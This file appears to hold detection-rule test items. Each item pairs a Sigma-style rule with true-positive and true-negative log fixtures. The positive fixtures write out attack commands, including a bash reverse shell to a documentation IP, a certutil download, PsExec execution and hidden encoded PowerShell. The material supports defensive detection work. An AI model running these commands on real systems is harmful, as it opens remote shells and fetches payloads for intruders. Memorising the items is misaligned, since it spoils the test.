description: Detect certutil being used to download a file from a URL.
reference_rule:
id: ref-certutil
title: certutil download
level: high
tags:
- attack.command_and_control
- attack.t1105
detection:
  selection:
    process_name|endswith: certutil.exe
    command_line|contains: urlcache
  condition: selection
fixtures:
  true_positive:
    process_name: C:\Windows\System32\certutil.exe
    command_line: certutil -urlcache -f http://x/a a
  true_negative:
    process_name: C:\Windows\System32\certutil.exe
    command_line: certutil -hashfile a.txt SHA256

description: Detect a bash reverse shell to a remote host over /dev/tcp.
reference_rule:
id: ref-revshell
title: bash /dev/tcp reverse shell
level: high
tags:
- attack.execution
- attack.t1059.004
detection:
  selection:
    command_line|contains: /dev/tcp/
  condition: selection
fixtures:
  true_positive:
    process_name: /bin/bash
    command_line: bash -i >& /dev/tcp/198.51.100.9/9001 0>&1
  true_negative:
    process_name: /bin/bash
    command_line: bash /opt/scripts/deploy.sh

description: Detect the PsExec service binary being started on a target host.
reference_rule:
id: ref-psexesvc
title: PsExec service started
level: high
tags:
- attack.execution
- attack.t1569.002
detection:
  selection:
    process_name|endswith: PSEXESVC.exe
  condition: selection
fixtures:
  true_positive:
    process_name: C:\Windows\PSEXESVC.exe
    command_line: PSEXESVC.exe
  true_negative:
    process_name: C:\Windows\System32\services.exe
    command_line: services.exe

description: Detect enumeration of privileged domain groups with net.exe.
reference_rule:
id: ref-netgroup
title: domain group discovery
level: medium
tags:
- attack.discovery
- attack.t1069.002
detection:
  selection:
    process_name|endswith: net.exe
    command_line|contains: group
  condition: selection
fixtures:
  true_positive:
    process_name: C:\Windows\System32\net.exe
    command_line: net group "enterprise admins" /domain
  true_negative:
    process_name: C:\Windows\System32\net.exe
    command_line: 'net use Z: \\fileserver\share'

description: Detect PowerShell launched with an encoded command.
reference_rule:
id: ref-encps
title: encoded PowerShell
level: high
tags:
- attack.execution
- attack.t1059.001
detection:
  selection:
    process_name|endswith: powershell.exe
    command_line|contains: ' -enc '
  condition: selection
fixtures:
  true_positive:
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell -w hidden -enc AAAA
  true_negative:
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell -File C:\scripts\backup.ps1
